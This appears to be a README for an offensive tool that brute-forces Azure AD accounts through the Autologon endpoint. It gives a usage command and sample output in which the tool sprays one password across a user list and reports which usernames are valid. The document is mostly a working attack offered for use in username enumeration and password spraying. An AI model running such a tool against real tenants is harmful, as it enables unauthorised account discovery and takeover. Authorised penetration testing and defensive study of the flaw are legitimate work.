# AzureAD_Autologon_Brute
Brute force attack tool for Azure AD Autologon 

https://arstechnica.com/information-technology/2021/09/new-azure-active-directory-password-brute-forcing-flaw-has-no-fix/


```
Usage:
python3 azuread_autologon_brute.py -d intranet.directory -U users.txt -p Password1
```


```
[~/deuce/azuread_autologon] # python3 azuread_autologon_brute.py -d intranet.directory -U users.txt -p Password1
Domain is  intranet.directory
Setting password as: Password1
Reading users from file: users.txt

+-----------------------------------------+
|          AzureAD AutoLogon Brute          |
|     2021.09.30 @nyxgeek - TrustedSec      |
+-----------------------------------------+

[-] Username not found:wumpus@intranet.directory:Password1
[+] VALID USERNAME, invalid password :stephen.falken@intranet.directory:Password1
[-] Username not found:grand.poobah@intranet.directory:Password1
[-] Username not found:thewiz@intranet.directory:Password1
[-] Username not found:bingobongo@intranet.directory:Password1
[-] Username not found:administrator@intranet.directory:Password1
[+] VALID USERNAME, invalid password :david.lightman@intranet.directory:Password1
[-] Username not found:fakeuser123@intranet.directory:Password1
[+] VALID USERNAME, invalid password :nyxgeek@intranet.directory:Password1
[-] Username not found:jabberwocky@intranet.directory:Password1

```
